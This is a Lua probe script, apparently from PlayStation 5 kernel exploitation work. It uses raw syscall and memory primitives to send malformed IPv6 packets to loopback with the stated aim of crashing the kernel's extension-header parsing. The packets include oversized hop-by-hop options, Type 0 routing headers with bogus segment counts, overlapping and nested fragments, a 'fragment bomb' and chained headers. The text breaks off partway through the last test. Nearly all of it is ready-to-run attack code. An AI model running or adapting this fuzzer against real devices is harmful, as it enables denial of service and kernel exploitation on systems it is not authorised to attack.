-- CRASH_CLASS: HIGH
-- PROBE 48c: IPv6 Extension Header Fuzzing via Raw Socket Loopback
--
-- Context: Probe 48a confirmed full IPv6 stack availability — TCP, UDP,
-- RAW, ICMPv6 all work. Raw IPv6 sockets (AF_INET6/SOCK_RAW) open fine.
--
-- Attack: IPv6 extension headers are parsed in-kernel by ip6_input() before
-- any socket processing. Malformed extension headers hit:
--   - ip6_hopopts()     — Hop-by-Hop options (type 0)
--   - ip6_rthdr()       — Routing header (type 43) — especially Type 0 (deprecated, CVE-2007-2242)
--   - ip6_destopt()     — Destination options (type 60)
--   - ip6_frag_input()  — Fragment header (type 44) — overlapping fragments, tiny frags
--   - ip6_none_input()  — No Next Header (type 59)
--
-- FreeBSD CVE history: RH0 amplification, fragment reassembly bugs, hop-by-hop
-- option parsing overflows, routing header loop bugs.
--
-- We send crafted IPv6 packets with malformed extension headers to ::1 (loopback)
-- via raw IPv6 socket. Kernel parses headers IN KERNEL CONTEXT.
-- Also test link-local (fe80::1%lo0) and PS5 LAN if available.
--
-- A crash/reboot = kernel IPv6 header parsing bug found.

print("=== PROBE 48c: IPv6 EXTENSION HEADER FUZZ ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wb(addr, val)
    local ok = pcall(function() memory.write_byte(addr, val) end)
    return ok
end
local function safe_ww(addr, val)
    local ok = pcall(function() memory.write_word(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end

local pid = syscall.getpid():tonumber()
print("pid: " .. pid)

local sc_socket = make_syscall(97)
local sc_close = make_syscall(6)
local sc_setsockopt = make_syscall(105)
local sc_sendto = make_syscall(133)
local sc_bind = make_syscall(104)

local AF_INET6 = 28
local SOCK_RAW = 3
local IPPROTO_RAW = 255
local IPPROTO_HOPOPTS = 0
local IPPROTO_ROUTING = 43
local IPPROTO_FRAGMENT = 44
local IPPROTO_DSTOPTS = 60
local IPPROTO_NONE = 59
local IPPROTO_ICMPV6 = 58
local IPPROTO_UDP = 17

local IPV6_HDRINCL = 36

local sent = 0
local errors = 0

-- ============================================
-- SECTION A: Create raw IPv6 socket
-- ============================================
print("--- SECTION A: Raw IPv6 socket setup ---")

-- We use IPPROTO_RAW for sending arbitrary IPv6 packets
-- Try raw socket with proto 255 (raw) first, then ICMPv6 as fallback
local raw6 = nil
local raw6_proto = 0

-- Method 1: AF_INET6 + SOCK_RAW + IPPROTO_RAW
do
    local ret = sc_socket(uint64(AF_INET6), uint64(SOCK_RAW), uint64(IPPROTO_RAW))
    local fd = to_num(ret)
    if fd > 0 then
        raw6 = fd
        raw6_proto = IPPROTO_RAW
        print("  raw IPv6 socket (proto RAW/255): fd=" .. fd)
    else
        print("  raw IPv6 (proto RAW/255) failed: " .. fd)
    end
end

-- Method 2: Try with IPV6_HDRINCL on a UDP-raw socket
-- Some FreeBSD versions need IPV6_HDRINCL to send full IPv6 packets
if raw6 then
    local ret = sc_setsockopt(uint64(raw6), uint64(41), uint64(IPV6_HDRINCL),
        uint64(0), uint64(0))
    print("  IPV6_HDRINCL setsockopt: " .. to_num(ret))
end

-- Method 3: Also open ICMPV6 raw socket (doesn't need HDRINCL for some ops)
local icmp6_fd = nil
do
    local ret = sc_socket(uint64(AF_INET6), uint64(SOCK_RAW), uint64(IPPROTO_ICMPV6))
    local fd = to_num(ret)
    if fd > 0 then
        icmp6_fd = fd
        print("  ICMPv6 raw socket: fd=" .. fd)
    else
        print("  ICMPv6 raw failed: " .. fd)
    end
end

-- Also try raw IPv4 socket for sending IPv6-in-IPv4 (proto 41) to loopback
local raw4_fd = nil
do
    local ret = sc_socket(uint64(2), uint64(SOCK_RAW), uint64(41))
    local fd = to_num(ret)
    if fd > 0 then
        raw4_fd = fd
        print("  raw IPv4 (proto 41/IPv6-in-IPv4): fd=" .. fd)
        -- Set IP_HDRINCL
        local one = memory.alloc(4)
        safe_wd(one, 1)
        sc_setsockopt(uint64(raw4_fd), uint64(0), uint64(2), uint64(one), uint64(4))
    else
        print("  raw IPv4 proto 41 failed: " .. fd)
    end
end

-- For IPv6 sendto, we need sockaddr_in6 structure
-- struct sockaddr_in6 { uint8 len=28, uint8 family=28, uint16 port, uint32 flowinfo,
--                       uint8[16] addr, uint32 scope_id }  = 28 bytes
local function make_sockaddr_in6(addr_bytes, port, scope_id)
    local sa = memory.alloc(32)
    safe_wb(sa, 28)            -- sin6_len
    safe_wb(sa + 1, AF_INET6)  -- sin6_family
    safe_ww(sa + 2, port)      -- sin6_port (network byte order)
    safe_wd(sa + 4, 0)         -- sin6_flowinfo
    -- sin6_addr at offset 8, 16 bytes
    for i = 0, #addr_bytes - 1 do
        if i < 16 then
            safe_wb(sa + 8 + i, addr_bytes[i + 1])
        end
    end
    safe_wd(sa + 24, scope_id or 0)  -- sin6_scope_id
    return sa
end

-- ::1 (loopback)
local lo6 = make_sockaddr_in6({0,0,0,0, 0,0,0,0, 0,0,0,0, 0,0,0,1}, 0, 0)

-- For raw IPv4 approach: sockaddr_in for 127.0.0.1
local function make_sockaddr_in4(ip_bytes, port)
    local sa = memory.alloc(16)
    safe_wb(sa, 16)      -- sin_len
    safe_wb(sa + 1, 2)   -- AF_INET
    safe_ww(sa + 2, port)
    safe_wb(sa + 4, ip_bytes[1])
    safe_wb(sa + 5, ip_bytes[2])
    safe_wb(sa + 6, ip_bytes[3])
    safe_wb(sa + 7, ip_bytes[4])
    return sa
end

local lo4 = make_sockaddr_in4({127, 0, 0, 1}, 0)

print("")

-- ============================================
-- Helper: Build IPv6 packet in buffer
-- ============================================
-- IPv6 header: 40 bytes
-- struct ip6_hdr {
--   uint32 vtc_flow;   // version(4) + traffic class(8) + flow label(20)
--   uint16 plen;       // payload length
--   uint8  nxt;        // next header
--   uint8  hlim;       // hop limit
--   uint8  src[16];    // source
--   uint8  dst[16];    // destination
-- }

local function build_ipv6_hdr(buf, offset, payload_len, next_hdr)
    -- Version 6, traffic class 0, flow label 0 → 0x60000000
    safe_wb(buf + offset, 0x60)
    safe_wb(buf + offset + 1, 0)
    safe_wb(buf + offset + 2, 0)
    safe_wb(buf + offset + 3, 0)
    -- Payload length (big-endian)
    safe_wb(buf + offset + 4, math.floor(payload_len / 256))
    safe_wb(buf + offset + 5, payload_len % 256)
    -- Next header
    safe_wb(buf + offset + 6, next_hdr)
    -- Hop limit
    safe_wb(buf + offset + 7, 64)
    -- Source: ::1
    for i = 0, 14 do safe_wb(buf + offset + 8 + i, 0) end
    safe_wb(buf + offset + 23, 1)
    -- Destination: ::1
    for i = 0, 14 do safe_wb(buf + offset + 24 + i, 0) end
    safe_wb(buf + offset + 39, 1)
    return 40
end

-- Helper: send raw packet via IPv6 socket
local function send_ipv6(buf, total_len, desc)
    -- Try direct IPv6 sendto first (sending just the payload after IPv6 header)
    -- Raw IPv6 sockets typically don't include the IPv6 header in sendto
    -- But with IPV6_HDRINCL they should
    local ok, ret_val
    if raw6 then
        ok, ret_val = pcall(function()
            return sc_sendto(uint64(raw6), uint64(buf), uint64(total_len),
                uint64(0), uint64(lo6), uint64(28))
        end)
        if ok then
            local rv = to_num(ret_val)
            if rv >= 0 then
                sent = sent + 1
                print("  [v6] " .. desc .. " → sent " .. rv .. "b")
                return true
            else
                print("  [v6] " .. desc .. " → err " .. rv)
            end
        end
    end

    -- Fallback: try sending via raw IPv4 socket as IPv6-in-IPv4 (proto 41)
    -- Build IPv4 header + our IPv6 packet
    if raw4_fd then
        local ipv4_total = 20 + total_len
        local pkt4 = memory.alloc(ipv4_total + 16)
        -- IPv4 header
        safe_wb(pkt4, 0x45)      -- version 4, IHL 5
        safe_wb(pkt4 + 1, 0)     -- TOS
        safe_wb(pkt4 + 2, math.floor(ipv4_total / 256))
        safe_wb(pkt4 + 3, ipv4_total % 256)
        safe_ww(pkt4 + 4, 0x4200)  -- identification
        safe_ww(pkt4 + 6, 0)       -- flags + frag offset
        safe_wb(pkt4 + 8, 64)      -- TTL
        safe_wb(pkt4 + 9, 41)      -- proto = IPv6-in-IPv4
        safe_ww(pkt4 + 10, 0)      -- checksum (kernel fills)
        -- src = 127.0.0.1
        safe_wb(pkt4 + 12, 127); safe_wb(pkt4 + 13, 0)
        safe_wb(pkt4 + 14, 0);   safe_wb(pkt4 + 15, 1)
        -- dst = 127.0.0.1
        safe_wb(pkt4 + 16, 127); safe_wb(pkt4 + 17, 0)
        safe_wb(pkt4 + 18, 0);   safe_wb(pkt4 + 19, 1)
        -- Copy IPv6 packet after IPv4 header
        for i = 0, total_len - 1 do
            local b = safe_rd(buf + i)
            if b then safe_wb(pkt4 + 20 + i, b % 256) end
        end
        ok, ret_val = pcall(function()
            return sc_sendto(uint64(raw4_fd), uint64(pkt4), uint64(ipv4_total),
                uint64(0), uint64(lo4), uint64(16))
        end)
        if ok then
            local rv = to_num(ret_val)
            if rv >= 0 then
                sent = sent + 1
                print("  [4in6] " .. desc .. " → sent " .. rv .. "b")
                return true
            else
                print("  [4in6] " .. desc .. " → err " .. rv)
            end
        end
    end

    -- Fallback: try ICMPv6 socket (just payload, no IP header)
    if icmp6_fd then
        ok, ret_val = pcall(function()
            return sc_sendto(uint64(icmp6_fd), uint64(buf + 40), uint64(total_len - 40),
                uint64(0), uint64(lo6), uint64(28))
        end)
        if ok then
            local rv = to_num(ret_val)
            if rv >= 0 then
                sent = sent + 1
                print("  [icmp6] " .. desc .. " → sent " .. rv .. "b")
                return true
            else
                print("  [icmp6] " .. desc .. " → err " .. rv)
            end
        end
    end

    errors = errors + 1
    print("  [FAIL] " .. desc)
    return false
end

-- ============================================
-- SECTION B: Hop-by-Hop Options fuzzing
-- ============================================
print("--- SECTION B: Hop-by-Hop Options (type 0) ---")
print("  Targets: ip6_hopopts(), ip6_process_hopopts()")
print("")

-- Hop-by-Hop header format:
-- uint8 next_header, uint8 hdr_ext_len (in 8-byte units minus 1), then options
-- Minimum: 8 bytes (hdr_ext_len=0 → 8 bytes)
-- Option format: type(1) + len(1) + data(len) — except Pad1 (type=0, no len)

-- B1: Valid Hop-by-Hop with PadN option
do
    local buf = memory.alloc(64)
    local off = build_ipv6_hdr(buf, 0, 8, IPPROTO_HOPOPTS)  -- next=0 (hop-by-hop)
    -- Hop-by-Hop header: next=IPPROTO_NONE(59), len=0 (8 bytes total)
    safe_wb(buf + off, IPPROTO_NONE)   -- next header
    safe_wb(buf + off + 1, 0)          -- hdr_ext_len = 0 (8 bytes)
    safe_wb(buf + off + 2, 1)          -- PadN option type
    safe_wb(buf + off + 3, 4)          -- PadN length = 4
    safe_wb(buf + off + 4, 0)          -- padding
    safe_wb(buf + off + 5, 0)
    safe_wb(buf + off + 6, 0)
    safe_wb(buf + off + 7, 0)
    send_ipv6(buf, off + 8, "B1: valid hop-by-hop PadN")
end

-- B2: Hop-by-Hop with hdr_ext_len=0 but option claiming to extend past
do
    local buf = memory.alloc(64)
    local off = build_ipv6_hdr(buf, 0, 8, IPPROTO_HOPOPTS)
    safe_wb(buf + off, IPPROTO_NONE)
    safe_wb(buf + off + 1, 0)          -- 8 bytes total
    safe_wb(buf + off + 2, 1)          -- PadN
    safe_wb(buf + off + 3, 100)        -- PadN len=100 — WAY past header end
    safe_wb(buf + off + 4, 0)
    safe_wb(buf + off + 5, 0)
    safe_wb(buf + off + 6, 0)
    safe_wb(buf + off + 7, 0)
    send_ipv6(buf, off + 8, "B2: hop-by-hop option overrun (PadN len=100)")
end

-- B3: Hop-by-Hop with hdr_ext_len=255 (max, 2048 bytes) but short actual packet
do
    local buf = memory.alloc(64)
    local off = build_ipv6_hdr(buf, 0, 8, IPPROTO_HOPOPTS)
    safe_wb(buf + off, IPPROTO_NONE)
    safe_wb(buf + off + 1, 255)        -- claims 2048 bytes but only 8 sent
    safe_wb(buf + off + 2, 0)
    safe_wb(buf + off + 3, 0)
    safe_wb(buf + off + 4, 0)
    safe_wb(buf + off + 5, 0)
    safe_wb(buf + off + 6, 0)
    safe_wb(buf + off + 7, 0)
    send_ipv6(buf, off + 8, "B3: hop-by-hop len=255 but only 8B sent")
end

-- B4: Hop-by-Hop with Router Alert option (type=0x05, len=2)
do
    local buf = memory.alloc(64)
    local off = build_ipv6_hdr(buf, 0, 8, IPPROTO_HOPOPTS)
    safe_wb(buf + off, IPPROTO_NONE)
    safe_wb(buf + off + 1, 0)          -- 8 bytes
    safe_wb(buf + off + 2, 0x05)       -- Router Alert
    safe_wb(buf + off + 3, 2)          -- len=2
    safe_wb(buf + off + 4, 0)          -- value=0 (MLD)
    safe_wb(buf + off + 5, 0)
    safe_wb(buf + off + 6, 1)          -- Pad1
    safe_wb(buf + off + 7, 0)          -- Pad1
    send_ipv6(buf, off + 8, "B4: hop-by-hop Router Alert")
end

-- B5: Hop-by-Hop with Jumbo Payload option (type=0xC2, len=4, payload>65535)
do
    local buf = memory.alloc(64)
    local off = build_ipv6_hdr(buf, 0, 8, IPPROTO_HOPOPTS)
    -- Set payload length to 0 (required for jumbograms)
    safe_wb(buf + 4, 0)
    safe_wb(buf + 5, 0)
    safe_wb(buf + off, IPPROTO_NONE)
    safe_wb(buf + off + 1, 0)          -- 8 bytes
    safe_wb(buf + off + 2, 0xC2)       -- Jumbo Payload option
    safe_wb(buf + off + 3, 4)          -- len=4
    safe_wb(buf + off + 4, 0xFF)       -- jumbo length = 0xFFFFFFFF (4GB)
    safe_wb(buf + off + 5, 0xFF)
    safe_wb(buf + off + 6, 0xFF)
    safe_wb(buf + off + 7, 0xFF)
    send_ipv6(buf, off + 8, "B5: hop-by-hop Jumbo Payload 4GB")
end

-- B6: Hop-by-Hop with unknown option types (high bits control action)
-- Bits 6-7: 00=skip, 01=discard, 10=discard+ICMP, 11=discard+ICMP if !multicast
for _, otype in ipairs({0x40, 0x80, 0xC0, 0x3F, 0x7F, 0xBF, 0xFF}) do
    local buf = memory.alloc(64)
    local off = build_ipv6_hdr(buf, 0, 8, IPPROTO_HOPOPTS)
    safe_wb(buf + off, IPPROTO_NONE)
    safe_wb(buf + off + 1, 0)
    safe_wb(buf + off + 2, otype)      -- unknown option type
    safe_wb(buf + off + 3, 4)          -- len=4
    safe_wb(buf + off + 4, 0xDE)
    safe_wb(buf + off + 5, 0xAD)
    safe_wb(buf + off + 6, 0xBE)
    safe_wb(buf + off + 7, 0xEF)
    send_ipv6(buf, off + 8, string.format("B6: hop-by-hop unknown type 0x%02X", otype))
end

-- B7: Double Hop-by-Hop (RFC says MUST NOT appear more than once)
do
    local buf = memory.alloc(96)
    local off = build_ipv6_hdr(buf, 0, 16, IPPROTO_HOPOPTS)
    -- First hop-by-hop → next = hop-by-hop again
    safe_wb(buf + off, IPPROTO_HOPOPTS) -- next = ANOTHER hop-by-hop
    safe_wb(buf + off + 1, 0)
    safe_wb(buf + off + 2, 1); safe_wb(buf + off + 3, 4)  -- PadN(4)
    safe_wb(buf + off + 4, 0); safe_wb(buf + off + 5, 0)
    safe_wb(buf + off + 6, 0); safe_wb(buf + off + 7, 0)
    -- Second hop-by-hop
    safe_wb(buf + off + 8, IPPROTO_NONE)
    safe_wb(buf + off + 9, 0)
    safe_wb(buf + off + 10, 1); safe_wb(buf + off + 11, 4)
    safe_wb(buf + off + 12, 0); safe_wb(buf + off + 13, 0)
    safe_wb(buf + off + 14, 0); safe_wb(buf + off + 15, 0)
    send_ipv6(buf, off + 16, "B7: double hop-by-hop (RFC violation)")
end

print("")

-- ============================================
-- SECTION C: Routing Header fuzzing
-- ============================================
print("--- SECTION C: Routing Header (type 43) ---")
print("  Targets: ip6_rthdr(), ip6_rthdr0() — Type 0 is deprecated/CVE")
print("")

-- Routing header format:
-- uint8 nxt, uint8 len, uint8 type, uint8 segleft, then type-specific data
-- Type 0: deprecated (CVE-2007-2242) — each 16-byte entry is an intermediate addr
-- Type 2: Mobile IPv6 home address (8 bytes min)

-- C1: Routing header Type 0 with segleft > 0 (should be rejected but test parsing)
do
    local buf = memory.alloc(96)
    local off = build_ipv6_hdr(buf, 0, 24, IPPROTO_ROUTING)
    safe_wb(buf + off, IPPROTO_NONE)   -- next
    safe_wb(buf + off + 1, 2)          -- len=2 → 24 bytes (8 + 16*1 intermediate addr)
    safe_wb(buf + off + 2, 0)          -- type=0 (DEPRECATED)
    safe_wb(buf + off + 3, 1)          -- segments left=1
    safe_wd(buf + off + 4, 0)          -- reserved
    -- Intermediate address: ::1
    for i = 0, 14 do safe_wb(buf + off + 8 + i, 0) end
    safe_wb(buf + off + 23, 1)
    send_ipv6(buf, off + 24, "C1: RH Type 0 segleft=1 (deprecated CVE)")
end

-- C2: Routing header Type 0 with segleft=255 but only 1 address
do
    local buf = memory.alloc(96)
    local off = build_ipv6_hdr(buf, 0, 24, IPPROTO_ROUTING)
    safe_wb(buf + off, IPPROTO_NONE)
    safe_wb(buf + off + 1, 2)          -- len=2 (24 bytes)
    safe_wb(buf + off + 2, 0)          -- type=0
    safe_wb(buf + off + 3, 255)        -- segleft=255 but only 1 addr!
    safe_wd(buf + off + 4, 0)
    for i = 0, 14 do safe_wb(buf + off + 8 + i, 0) end
    safe_wb(buf + off + 23, 1)
    send_ipv6(buf, off + 24, "C2: RH Type 0 segleft=255 (overflow)")
end

-- C3: Routing header Type 2 (Mobile IPv6)
do
    local buf = memory.alloc(96)
    local off = build_ipv6_hdr(buf, 0, 24, IPPROTO_ROUTING)
    safe_wb(buf + off, IPPROTO_NONE)
    safe_wb(buf + off + 1, 2)          -- len=2 (24 bytes)
    safe_wb(buf + off + 2, 2)          -- type=2 (Mobile IPv6)
    safe_wb(buf + off + 3, 1)          -- segleft=1
    safe_wd(buf + off + 4, 0)          -- reserved
    -- Home address: ::1
    for i = 0, 14 do safe_wb(buf + off + 8 + i, 0) end
    safe_wb(buf + off + 23, 1)
    send_ipv6(buf, off + 24, "C3: RH Type 2 (MobileIPv6) segleft=1")
end

-- C4: Routing header with unknown type (255)
do
    local buf = memory.alloc(64)
    local off = build_ipv6_hdr(buf, 0, 8, IPPROTO_ROUTING)
    safe_wb(buf + off, IPPROTO_NONE)
    safe_wb(buf + off + 1, 0)          -- len=0 (8 bytes minimal)
    safe_wb(buf + off + 2, 255)        -- type=255 (unknown)
    safe_wb(buf + off + 3, 1)          -- segleft=1
    safe_wd(buf + off + 4, 0xDEADBEEF)
    send_ipv6(buf, off + 8, "C4: RH unknown type 255 segleft=1")
end

-- C5: Routing header len=0 but segleft > 0
do
    local buf = memory.alloc(64)
    local off = build_ipv6_hdr(buf, 0, 8, IPPROTO_ROUTING)
    safe_wb(buf + off, IPPROTO_NONE)
    safe_wb(buf + off + 1, 0)          -- len=0 (8 bytes, no addresses)
    safe_wb(buf + off + 2, 0)          -- type=0
    safe_wb(buf + off + 3, 10)         -- segleft=10 but no addresses!
    safe_wd(buf + off + 4, 0)
    send_ipv6(buf, off + 8, "C5: RH len=0 but segleft=10 (underflow)")
end

-- C6: Routing header with len=255 (max, claims 2048 bytes)
do
    local buf = memory.alloc(64)
    local off = build_ipv6_hdr(buf, 0, 8, IPPROTO_ROUTING)
    safe_wb(buf + off, IPPROTO_NONE)
    safe_wb(buf + off + 1, 255)        -- len=255 (2048 bytes) but only 8 sent
    safe_wb(buf + off + 2, 0)
    safe_wb(buf + off + 3, 127)        -- segleft=127
    safe_wd(buf + off + 4, 0)
    send_ipv6(buf, off + 8, "C6: RH len=255 but only 8B (read past buffer)")
end

print("")

-- ============================================
-- SECTION D: Fragment Header fuzzing
-- ============================================
print("--- SECTION D: Fragment Header (type 44) ---")
print("  Targets: ip6_frag_input(), frag6_input()")
print("")

-- Fragment header: 8 bytes always
-- uint8 nxt, uint8 reserved, uint16 offlg (13-bit offset + 2 reserved + M flag), uint32 id

-- D1: Fragment offset 0, M=1, tiny payload (triggers reassembly state)
do
    local buf = memory.alloc(64)
    local off = build_ipv6_hdr(buf, 0, 16, IPPROTO_FRAGMENT)
    safe_wb(buf + off, IPPROTO_UDP)    -- next = UDP
    safe_wb(buf + off + 1, 0)          -- reserved
    -- offset=0, M=1 → offlg = 0x0001
    safe_wb(buf + off + 2, 0x00)
    safe_wb(buf + off + 3, 0x01)       -- M=1
    safe_wd(buf + off + 4, 0x41000001) -- identification
    -- 8 bytes of "fragment payload"
    for i = 0, 7 do safe_wb(buf + off + 8 + i, 0xAA) end
    send_ipv6(buf, off + 16, "D1: frag offset=0 M=1 (start reassembly)")
end

-- D2: Fragment with huge offset
do
    local buf = memory.alloc(64)
    local off = build_ipv6_hdr(buf, 0, 16, IPPROTO_FRAGMENT)
    safe_wb(buf + off, IPPROTO_UDP)
    safe_wb(buf + off + 1, 0)
    -- offset=8191 (max 13-bit), M=0 → 0xFFF8
    safe_wb(buf + off + 2, 0xFF)
    safe_wb(buf + off + 3, 0xF8)       -- offset=8191*8=65528, M=0
    safe_wd(buf + off + 4, 0x41000002)
    for i = 0, 7 do safe_wb(buf + off + 8 + i, 0xBB) end
    send_ipv6(buf, off + 16, "D2: frag offset=8191 (max, no first frag)")
end

-- D3: Overlapping IPv6 fragments (same ID)
do
    -- First fragment: offset=0, M=1
    local buf1 = memory.alloc(80)
    local off1 = build_ipv6_hdr(buf1, 0, 24, IPPROTO_FRAGMENT)
    safe_wb(buf1 + off1, IPPROTO_UDP)
    safe_wb(buf1 + off1 + 1, 0)
    safe_wb(buf1 + off1 + 2, 0x00)     -- offset=0
    safe_wb(buf1 + off1 + 3, 0x01)     -- M=1
    safe_wd(buf1 + off1 + 4, 0x41000003)
    for i = 0, 15 do safe_wb(buf1 + off1 + 8 + i, 0xCC) end
    send_ipv6(buf1, off1 + 24, "D3a: overlap frag1 offset=0 M=1")

    -- Second fragment: offset=1 (8 bytes, OVERLAPS with first), M=0
    local buf2 = memory.alloc(80)
    local off2 = build_ipv6_hdr(buf2, 0, 24, IPPROTO_FRAGMENT)
    safe_wb(buf2 + off2, IPPROTO_UDP)
    safe_wb(buf2 + off2 + 1, 0)
    safe_wb(buf2 + off2 + 2, 0x00)     -- offset=1 (8 bytes in)
    safe_wb(buf2 + off2 + 3, 0x08)     -- offset=1, M=0
    safe_wd(buf2 + off2 + 4, 0x41000003) -- same ID!
    for i = 0, 15 do safe_wb(buf2 + off2 + 8 + i, 0xDD) end
    send_ipv6(buf2, off2 + 24, "D3b: overlap frag2 offset=1 M=0 (OVERLAPS)")
end

-- D4: Atomic fragment (offset=0, M=0 — RFC 6946)
do
    local buf = memory.alloc(64)
    local off = build_ipv6_hdr(buf, 0, 16, IPPROTO_FRAGMENT)
    safe_wb(buf + off, IPPROTO_NONE)
    safe_wb(buf + off + 1, 0)
    safe_wb(buf + off + 2, 0x00)       -- offset=0
    safe_wb(buf + off + 3, 0x00)       -- M=0 → "atomic fragment"
    safe_wd(buf + off + 4, 0x41000004)
    for i = 0, 7 do safe_wb(buf + off + 8 + i, 0xEE) end
    send_ipv6(buf, off + 16, "D4: atomic fragment (offset=0 M=0)")
end

-- D5: Fragment bomb — 32 different IDs, first frag only, never completed
for i = 0, 31 do
    local buf = memory.alloc(64)
    local off = build_ipv6_hdr(buf, 0, 16, IPPROTO_FRAGMENT)
    safe_wb(buf + off, IPPROTO_UDP)
    safe_wb(buf + off + 1, 0)
    safe_wb(buf + off + 2, 0x00)       -- offset=0
    safe_wb(buf + off + 3, 0x01)       -- M=1 (more coming... but never sent)
    safe_wd(buf + off + 4, 0x41000100 + i)  -- unique ID
    for j = 0, 7 do safe_wb(buf + off + 8 + j, 0xFF) end
    if i == 0 or i == 31 then
        send_ipv6(buf, off + 16, string.format("D5: frag bomb ID=0x%X (%d/32)", 0x41000100 + i, i + 1))
    else
        -- Send silently to not flood output
        if raw6 then
            pcall(function()
                sc_sendto(uint64(raw6), uint64(buf), uint64(off + 16),
                    uint64(0), uint64(lo6), uint64(28))
            end)
            sent = sent + 1
        end
    end
end
print("  D5: sent 32 fragment bomb first-frags")

-- D6: Nested fragment headers (fragment inside fragment — RFC violation)
do
    local buf = memory.alloc(80)
    local off = build_ipv6_hdr(buf, 0, 24, IPPROTO_FRAGMENT)
    -- First fragment header → next = FRAGMENT again
    safe_wb(buf + off, IPPROTO_FRAGMENT) -- nested fragment!
    safe_wb(buf + off + 1, 0)
    safe_wb(buf + off + 2, 0x00)
    safe_wb(buf + off + 3, 0x00)       -- offset=0, M=0
    safe_wd(buf + off + 4, 0x41000005)
    -- Second fragment header
    safe_wb(buf + off + 8, IPPROTO_NONE)
    safe_wb(buf + off + 9, 0)
    safe_wb(buf + off + 10, 0x00)
    safe_wb(buf + off + 11, 0x00)
    safe_wd(buf + off + 12, 0x41000006)
    for i = 0, 7 do safe_wb(buf + off + 16 + i, 0x42) end
    send_ipv6(buf, off + 24, "D6: nested fragment headers (RFC violation)")
end

print("")

-- ============================================
-- SECTION E: Destination Options fuzzing
-- ============================================
print("--- SECTION E: Destination Options (type 60) ---")
print("  Targets: ip6_destopt(), dest6_input()")
print("")

-- Same format as Hop-by-Hop but appears after routing header

-- E1: Valid Destination Options
do
    local buf = memory.alloc(64)
    local off = build_ipv6_hdr(buf, 0, 8, IPPROTO_DSTOPTS)
    safe_wb(buf + off, IPPROTO_NONE)
    safe_wb(buf + off + 1, 0)          -- 8 bytes
    safe_wb(buf + off + 2, 1)          -- PadN
    safe_wb(buf + off + 3, 4)          -- len=4
    safe_wd(buf + off + 4, 0)
    send_ipv6(buf, off + 8, "E1: valid dest options PadN")
end

-- E2: Dest options with Home Address option (type=0xC9, MobileIPv6)
do
    local buf = memory.alloc(96)
    local off = build_ipv6_hdr(buf, 0, 24, IPPROTO_DSTOPTS)
    safe_wb(buf + off, IPPROTO_NONE)
    safe_wb(buf + off + 1, 2)          -- len=2 (24 bytes)
    safe_wb(buf + off + 2, 0xC9)       -- Home Address option
    safe_wb(buf + off + 3, 16)         -- len=16 (IPv6 address)
    -- Home address: ::1
    for i = 0, 14 do safe_wb(buf + off + 4 + i, 0) end
    safe_wb(buf + off + 19, 1)
    safe_wd(buf + off + 20, 0)         -- padding
    send_ipv6(buf, off + 24, "E2: dest options Home Address (MobileIPv6)")
end

-- E3: Dest options with unknown option types (action bits)
for _, otype in ipairs({0x40, 0x80, 0xC0, 0xFF}) do
    local buf = memory.alloc(64)
    local off = build_ipv6_hdr(buf, 0, 8, IPPROTO_DSTOPTS)
    safe_wb(buf + off, IPPROTO_NONE)
    safe_wb(buf + off + 1, 0)
    safe_wb(buf + off + 2, otype)
    safe_wb(buf + off + 3, 4)
    safe_wd(buf + off + 4, 0xDEADC0DE)
    send_ipv6(buf, off + 8, string.format("E3: dest opt unknown type 0x%02X", otype))
end

print("")

-- ============================================
-- SECTION F: Chained extension headers
-- ============================================
print("--- SECTION F: Chained Extension Headers ---")
print("  Targets: header chain processing, loop detection")
print("")

-- F1: All headers chained: HopByHop → Routing → Fragment → Dest → None
do
    local buf = memory.alloc(128)
    -- Total payload: 8(hbh) + 8(rh) + 8(frag) + 8(dest) = 32
    local off = build_ipv6_hdr(buf, 0, 32, IPPROTO_HOPOPTS)
    -- Hop-by-hop → Routing
    safe_wb(buf + off, IPPROTO_ROUTING); safe_wb(buf + off + 1, 0)
    safe_wb(buf + off + 2, 1); safe_wb(buf + off + 3, 4)
    safe_wd(buf + off + 4, 0)
    -- Routing → Fragment
    safe_wb(buf + off + 8, IPPROTO_FRAGMENT); safe_wb(buf + off + 9, 0)
    safe_wb(buf + off + 10, 0); safe_wb(buf + off + 11, 0)  -- type=0, segleft=0
    safe_wd(buf + off + 12, 0)
    -- Fragment → Dest
    safe_wb(buf + off + 16, IPPROTO_DSTOPTS); safe_wb(buf + off + 17, 0)
    safe_wb(buf + off + 18, 0x00); safe_wb(buf + off + 19, 0x00)  -- offset=0, M=0
    safe_wd(buf + off + 20, 0x41000007)
    -- Dest → None
    safe_wb(buf + off + 24, IPPROTO_NONE); safe_wb(buf + off + 25, 0)
    safe_wb(buf + off + 26, 1); safe_wb(buf + off + 27, 4)
    safe_wd(buf + off + 28, 0)
    send_ipv6(buf, off + 32, "F1: full chain HBH→RH→Frag→Dest→None")
end

-- F2: 16 chained Destination Options headers
do
    local total_ext = 16 * 8  -- 128 bytes of extension headers
    local buf = memory.alloc(256)
    local off = build_ipv6_hdr(buf, 0, total_ext, IPPROTO_DSTOPTS)
    for i = 0, 14 do
        local base = off + i * 8
        safe_wb(buf + base, IPPROTO_DSTOPTS)  -- next = another dest opts
        safe_wb(buf + base + 1, 0)             -- 8 bytes
        safe_wb(buf + base + 2, 1); safe_wb(buf + base + 3, 4)
        safe_wd(buf + base + 4, 0)
    end
    -- Last one → None
    local last = off + 15 * 8
    safe_wb(buf + last, IPPROTO_NONE)
    safe_wb(buf + last + 1, 0)
    safe_wb(buf + last + 2, 1); safe_wb(buf + last + 3, 4)
    safe_wd(buf + last + 4, 0)
    send_ipv6(buf, off + total_ext, "F2: 16 chained Dest Options headers")
end

-- F3: Header chain loop — dest opts pointing to itself (next_header = 60)
-- Not a true loop (kernel processes linearly) but tests iteration bounds
do
    local buf = memory.alloc(64)
    local off = build_ipv6_hdr(buf, 0, 8, IPPROTO_DSTOPTS)
    safe_wb(buf + off, IPPROTO_DSTOPTS) -- next = dest opts (looks like loop)
    safe_wb(buf + off + 1, 0)
    safe_wb(buf + off + 2, 1); safe_wb(buf + off + 3, 4)
    safe_wd(buf + off + 4, 0)
